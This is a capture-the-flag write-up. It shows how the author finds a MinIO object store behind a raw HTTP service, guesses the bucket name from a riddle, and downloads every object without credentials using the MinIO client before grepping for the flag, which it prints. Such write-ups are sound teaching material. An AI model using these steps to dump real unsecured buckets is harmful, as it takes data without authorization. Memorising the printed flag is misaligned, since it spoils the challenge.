## Malibu
Well probably could've done this much faster had I avoided the age old over-complication. Anyways, we are given a hint before starting up the challenge:
`What do you bring to the beach?`
Following the instructions, we connect with the given `nc challenge.ctf.games PORT`. After hitting enter we see:
```html
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request   
```
Seems it is expecting requests. Let's try a simple GET request to see where we are.
```html
GET / HTTP/1.1
Host: challenge.ctf.games
```
It returns this:
```html
HTTP/1.1 403 Forbidden
Accept-Ranges: bytes
Content-Length: 254
Content-Type: application/xml
Server: MinIO
*snip*
```
Which actually tells us exactly what we need to know. 
**Server: MinIO**
Minio is for s3 Amazon cloud server stuff.
https://github.com/minio/minio

Well any digging into 'Amazon s3' will reveal they use `buckets`. Saving you the headache, this is what they meant in the riddle, something you might bring to the beach. Where I am from, that would be a *pail*, but whatever. Let's try `/bucket`.
```html
GET /bucket HTTP/1.1
Host: challenge.ctf.games

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 31114
Content-Type: application/xml
Server: MinIO
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
Vary: Accept-Encoding
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 17FB69A878A102DE
X-Content-Type-Options: nosniff
X-Ratelimit-Limit: 59
X-Ratelimit-Remaining: 58
X-Xss-Protection: 1; mode=block
Date: Sat, 05 Oct 2024 01:17:34 GMT

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>bucket</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys>
*snip*
```
Nice! The output is way too long to post here. But **200 OK** means we have access to this without credentials. Now I have experience using the minio cli from HTB, although within `/bucket` there was a cli to download.

I installed minioCLI like so:
```sh
wget https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc
sudo mv mc /usr/local/bin/
```
Then added this bucket into the CLI with this:
```sh
mc alias set myminio http://challenge.ctf.games:PORT
Enter Access Key: <blank>
Enter Secret Key: <blank>

Added `myminio` successfully.
```
Then used this command to dump everything onto my kali machine for analysis.
```sh
mc cp --recursive myminio/bucket .                   
...PSFCImJog: 249.31 KiB / 249.31 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 69.58 KiB/s 3s
```
Now we have a new directory '**bucket**' created locally. These folders have randomly generated names, so by using grep to search for 'flag{' we can search all of them quickly.
```sh
$ grep -r "flag{" .

*snip*
flag{800e6603e86fe0a68875d3335e0daf81}
*snip*
```
